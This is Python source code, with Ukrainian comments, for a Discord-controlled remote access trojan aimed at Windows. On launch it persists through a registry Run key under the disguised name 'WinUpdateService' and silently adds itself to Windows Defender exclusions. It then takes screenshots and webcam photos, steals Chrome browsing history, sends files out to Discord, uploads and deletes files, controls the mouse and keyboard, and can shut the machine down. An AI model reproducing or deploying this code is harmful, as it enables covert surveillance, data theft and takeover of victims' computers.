import disnake
from disnake.ext import commands
import io
import mss
import os
import socket
import pyautogui
import cv2
import winreg as reg
import sys
import shutil
import subprocess
import sqlite3
from PIL import Image, ImageDraw

# --- НАЛАШТУВАННЯ ---
OWNER_ID =  
TOKEN = ""

PC_NAME = socket.gethostname()
sessions = {}      
current_dir = {}   

# --- СИСТЕМНІ ФУНКЦІЇ ---

def add_to_startup():
    try:
        file_path = os.path.realpath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WinUpdateService", 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
    except: pass

def add_to_defender_exclusions():
    try:
        path = os.path.realpath(sys.argv[0])
        cmd = f"powershell -Command Add-MpPreference -ExclusionPath '{path}'"
        subprocess.run(cmd, shell=True, capture_output=True)
    except: pass

def get_app_paths():
    paths = [
        os.path.join(os.environ["USERPROFILE"], "Desktop"),
        os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs"),
        os.path.join(os.environ["AppData"], "Microsoft", "Windows", "Start Menu", "Programs")
    ]
    return [p for p in paths if os.path.exists(p)]

add_to_startup()
add_to_defender_exclusions()

# --- КОНФІГУРАЦІЯ БОТА ---
intents = disnake.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
pyautogui.PAUSE = 0.1
pyautogui.FAILSAFE = False

def is_active_session():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID and sessions.get(ctx.channel.id) == PC_NAME
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"✅ [{PC_NAME}] онлайн!")
    try:
        user = await bot.fetch_user(OWNER_ID)
        embed = disnake.Embed(title="🖥️ Пристрій активовано", color=0x2ecc71)
        embed.add_field(name="🆔 ID комп'ютера", value=f"`{PC_NAME}`", inline=False)
        embed.set_footer(text=f"Введіть !select {PC_NAME}")
        await user.send(embed=embed)
    except: pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure): return
    error_msg = str(error.original) if hasattr(error, 'original') else str(error)
    await ctx.send(f"⚠️ **Помилка виконання:** `{error_msg}`")

# --- КОМАНДИ ДОСТУПУ ТА СЕСІЙ ---

@bot.command()
async def select(ctx, name: str):
    if ctx.author.id != OWNER_ID: return
    if name.lower() == PC_NAME.lower():
        sessions[ctx.channel.id] = PC_NAME
        current_dir[ctx.channel.id] = os.getcwd()
        await ctx.send(f"🎯 **З'єднано з `{PC_NAME}`.**")
    else:
        if sessions.get(ctx.channel.id) == PC_NAME:
            sessions.pop(ctx.channel.id, None)

@bot.command()
async def sessions_list(ctx):
    if ctx.author.id != OWNER_ID: return
    active_in = [str(k) for k, v in sessions.items() if v == PC_NAME]
    if active_in:
        await ctx.send(f"📊 `{PC_NAME}` зараз керується у каналах: " + ", ".join(active_in))
    else:
        await ctx.send(f"📊 `{PC_NAME}` зараз не вибраний в жодному каналі.")

@bot.command(name="help")
async def help_cmd(ctx):
    if ctx.author.id != OWNER_ID: return
    s = "✅" if sessions.get(ctx.channel.id) == PC_NAME else "❌"
    h = (f"**ПК:** `{PC_NAME}` | **Сесія:** {s}\n\n"
         "🔌 `!select ID`, `!sessions_list`, `!exit`\n"
         "🖼️ `!ss`, `!webcam`, `!history`\n"
         "🖱️ `!mv x y`, `!click`, `!rclick`, `!type текст`, `!press клавіша`\n"
         "📁 `!ls`, `!cd шлях`, `!mkdir назва`, `!rm назва`\n"
         "📥 `!get файл` (скачати з ПК), `!upload` (залити на ПК)\n"
         "🚀 `!start назва`, `!apps`, `!shutdown`")
    await ctx.send(h)

# --- ФАЙЛОВИЙ МЕНЕДЖЕР ---

@bot.command()
@is_active_session()
async def ls(ctx):
    path = current_dir.get(ctx.channel.id, os.getcwd())
    items = os.listdir(path)
    res = f"📍 `{path}`:\n" + "\n".join([f"{'📁' if os.path.isdir(os.path.join(path, i)) else '📄'} {i}" for i in items])
    if len(res) > 1900: await ctx.send(file=disnake.File(io.BytesIO(res.encode()), "ls.txt"))
    else: await ctx.send(f"```\n{res}\n```")

@bot.command()
@is_active_session()
async def cd(ctx, *, path: str):
    cur = current_dir.get(ctx.channel.id, os.getcwd())
    new_p = os.path.abspath(os.path.join(cur, path))
    if os.path.isdir(new_p):
        current_dir[ctx.channel.id] = new_p
        await ctx.send(f"📂 Перейшов у: `{new_p}`")
    else: raise FileNotFoundError(f"Папка '{path}' не існує.")

@bot.command()
@is_active_session()
async def mkdir(ctx, *, name: str):
    path = os.path.join(current_dir.get(ctx.channel.id, os.getcwd()), name)
    os.makedirs(path, exist_ok=True)
    await ctx.send(f"✅ Створено: `{path}`")

@bot.command()
@is_active_session()
async def rm(ctx, *, name: str):
    path = os.path.join(current_dir.get(ctx.channel.id, os.getcwd()), name)
    if os.path.isdir(path): shutil.rmtree(path)
    else: os.remove(path)
    await ctx.send(f"🗑️ Видалено: `{name}`")

@bot.command()
@is_active_session()
async def get(ctx, *, filename: str):
    """СКАЧАТИ файл з ПК в Discord"""
    path = os.path.join(current_dir.get(ctx.channel.id, os.getcwd()), filename)
    await ctx.send(file=disnake.File(path))

@bot.command()
@is_active_session()
async def upload(ctx):
    """ЗАЛИТИ файл з Discord на ПК"""
    if not ctx.message.attachments: return await ctx.send("❌ Прикріпіть файл.")
    for attach in ctx.message.attachments:
        path = os.path.join(current_dir.get(ctx.channel.id, os.getcwd()), attach.filename)
        await attach.save(path)
        await ctx.send(f"✅ Збережено: `{attach.filename}`")

# --- ПРОГРАМИ ТА СИСТЕМА ---

@bot.command()
@is_active_session()
async def apps(ctx):
    found = set()
    for p in get_app_paths():
        for root, dirs, files in os.walk(p):
            for f in files:
                if f.endswith(".lnk"): found.add(f.replace(".lnk", ""))
    res = "🚀 **Встановлені програми:**\n" + "\n".join(sorted(list(found)))
    if len(res) > 1900: await ctx.send(file=disnake.File(io.BytesIO(res.encode()), "apps.txt"))
    else: await ctx.send(f"```\n{res}\n```")

@bot.command()
@is_active_session()
async def history(ctx):
    """Отримати історію Chrome"""
    history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
    temp_path = "history_temp"
    try:
        shutil.copy2(history_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        rows = cursor.fetchall()
        
        res = "🌐 **Остання історія (Chrome):**\n"
        for row in rows:
            res += f"🔗 {row[1][:50]}... - {row[0]}\n"
        
        conn.close()
        os.remove(temp_path)
        
        if len(res) > 1900:
            await ctx.send(file=disnake.File(io.BytesIO(res.encode()), "history.txt"))
        else:
            await ctx.send(res)
    except Exception as e:
        await ctx.send(f"❌ Не вдалося отримати історію: {e}")

@bot.command()
@is_active_session()
async def start(ctx, *, name: str):
    path = os.path.join(current_dir.get(ctx.channel.id, os.getcwd()), name)
    if os.path.exists(path):
        os.startfile(path)
    else:
        for p in get_app_paths():
            for root, dirs, files in os.walk(p):
                for f in files:
                    if f.lower().startswith(name.lower()) and f.endswith(".lnk"):
                        os.startfile(os.path.join(root, f))
                        return await ctx.send(f"✅ Запущено: `{f}`")
        os.startfile(name)
    await ctx.send(f"🚀 Спроба запуску: `{name}`")

# --- МЕДІА ТА КЕРУВАННЯ ---

@bot.command()
@is_active_session()
async def ss(ctx):
    with mss.mss() as sct:
        img_bin = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", img_bin.size, img_bin.bgra, "raw", "BGRX")
        x, y = pyautogui.position()
        draw = ImageDraw.Draw(img)
        draw.ellipse((x-15, y-15, x+15, y+15), outline="red", width=3)
        buf = io.BytesIO(); img.save(buf, format="PNG"); buf.seek(0)
        await ctx.send(file=disnake.File(buf, "screen.png"))

@bot.command()
@is_active_session()
async def mv(ctx, x: int, y: int):
    pyautogui.moveTo(x, y); await ctx.invoke(bot.get_command('ss'))

@bot.command()
@is_active_session()
async def click(ctx):
    pyautogui.click(); await ctx.invoke(bot.get_command('ss'))

@bot.command()
@is_active_session()
async def rclick(ctx):
    pyautogui.rightClick(); await ctx.invoke(bot.get_command('ss'))

@bot.command()
@is_active_session()
async def type(ctx, *, text: str):
    pyautogui.write(text, interval=0.01); await ctx.invoke(bot.get_command('ss'))

@bot.command()
@is_active_session()
async def press(ctx, key: str):
    pyautogui.press(key.lower())
    await ctx.invoke(bot.get_command('ss'))

@bot.command()
@is_active_session()
async def webcam(ctx):
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    for _ in range(5): cap.read()
    ret, frame = cap.read()
    if ret:
        img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        buf = io.BytesIO(); img.save(buf, format="JPEG"); buf.seek(0)
        await ctx.send(file=disnake.File(buf, "cam.jpg"))
    cap.release()

@bot.command()
@is_active_session()
async def shutdown(ctx):
    os.system("shutdown /s /t 60"); await ctx.send("⚠️ ПК вимкнеться через 60 сек.")

@bot.command()
@is_active_session()
async def exit(ctx):
    await ctx.send("💤 Бот завершив роботу."); await bot.close()

bot.run(TOKEN)